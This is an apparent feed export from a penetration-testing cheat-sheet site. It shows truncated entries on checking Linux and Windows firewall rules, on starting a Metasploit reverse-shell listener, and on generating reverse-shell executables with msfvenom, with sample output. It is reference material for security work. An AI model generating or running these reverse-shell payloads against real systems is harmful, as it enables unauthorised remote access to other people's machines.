channel.title: Firewall on TLDRBins
channel.description: Recent content in Firewall on TLDRBins

item.title: Firewall (Linux)
item.description: Linux Check Firewall Rules # Show all rules sudo iptables -L -v -n --line-numbers # Show target chain sudo iptables -L <CHAIN> -v -n --line-numbers sudo iptables -L INPUT -v -n --line-numbers Set Firewall Rules # Default policy sudo iptables -P <CHAIN> <RULE> sudo iptables -P INPUT DROP sudo iptables -A <CHAIN> -p <PROTOCOL> -s <SOURCE> --dport <PORT> -j <RULE> # Allow SSH from a specific subnet sudo iptables -A INPUT -p tcp -s 192.

item.title: Firewall (Windows)
item.description: Windows Check Firewall Rules powershell cmd # Check profiles Get-NetFirewallProfile *Evil-WinRM* PS C:\Users\maria> Get-NetFirewallProfile Name : Domain Enabled : False DefaultInboundAction : NotConfigured DefaultOutboundAction : NotConfigured AllowInboundRules : NotConfigured AllowLocalFirewallRules : NotConfigured AllowLocalIPsecRules : NotConfigured AllowUserApps : NotConfigured AllowUserPorts : NotConfigured AllowUnicastResponseToMulticast : NotConfigured NotifyOnListen : False EnableStealthModeForIPsec : NotConfigured LogFileName : %systemroot%\system32\LogFiles\Firewall\pfirewall.log LogMaxSizeKilobytes : 4096 LogAllowed : False LogBlocked : False LogIgnored : NotConfigured DisabledInterfaceAliases : {NotConfigured} ---[SNIP]--- # Check inbound rules Get-NetFirewallRule -Direction InBound -Enabled True PS C:\programdata> Get-NetFirewallRule -Direction Inbound -Enabled True Name : DeliveryOptimization-TCP-In DisplayName : Delivery Optimization (TCP-In) Description : Inbound rule to allow Delivery Optimization to connect to remote endpoints DisplayGroup : Delivery Optimization Group : @%systemroot%\system32\dosvc.

item.title: Metasploit Listener
item.description: Start a Metasploit Listener msfconsole -q $ msfconsole -q msf6 > use exploit/multi/handler msf6 > use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp # Windows x64 set payload windows/x64/meterpreter/reverse_tcp msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp payload => windows/x64/meterpreter/reverse_tcp # Linux amd64 set payload linux/x64/meterpreter/reverse_tcp msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp payload => linux/x64/meterpreter/reverse_tcp set lhost <LOCAL_IP> msf6 exploit(multi/handler) > set lhost 10.10.14.31 lhost => 10.10.14.31 set lport <LOCAL_PORT> msf6 exploit(multi/handler) > set lport 1337 lport => 1337 # Useful for multiple connections set exitonsession false msf6 exploit(multi/handler) > set exitonsession false exitonsession => false run -j msf6 exploit(multi/handler) > run -j [*] Exploit running as background job 1.

item.title: Metasploit Shellcode
item.description: Generate Shellcode Note: stageless payload can catch with nc directly Windows x64 (64-bit) Staged exe Stageless exe Staged dll Stageless dll msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.exe $ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=10.10.14.31 LPORT=1337 > rev.exe No encoder specified, outputting raw payload Payload size: 510 bytes Final size of exe file: 7168 bytes msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f exe --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.
